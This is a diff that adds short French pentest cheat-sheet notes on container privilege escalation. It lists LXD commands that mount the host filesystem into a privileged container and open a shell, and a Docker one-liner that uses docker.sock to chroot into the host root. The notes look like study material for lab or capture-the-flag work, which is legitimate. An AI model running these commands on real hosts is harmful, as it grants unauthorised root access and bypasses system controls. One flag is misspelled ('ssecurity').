@@ -1,0 +1,25 @@
+##Containers
+
+#LXC (Linux Containers)
+LXD --> Linux Daemon
+Controler que le user est membre du groupe "lxd" (116) --> id
+Checker la présence d'images de containers (ext. tar.xz ou tar.gz)
+Importer l'image dans lxd:
+	lxc image import <NOM_IMAGE> --alias <NOM_ALIAS>
+	lxc image list
+Initialiser l'image:
+	lxc init <NOM_ALIAS> privesc -c ssecurity.privileged=true
+	lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+Lancer le container:
+	lxc start privesc
+	lxc exec privesc /bin/bash OU /bin/sh
+
+
+#Docker
+Architecture Client-Server: Docker Daemon (server) et Docker client
+-Connexion au Docker en ssh (Si creds ou clé priv.)
+-Controler le membership au groupe "docker" pour privesc --> id
+-Checker si des images docker existent --> docker image ls
+
+Si présence du fichier docker.sock, nous avons la possibilité de communiquer avec le "Docker Daemon"
+docker -H unix:///<emplacement_docker.sock> run -v /:/mnt --rm -it ubuntu chroot /mnt bash
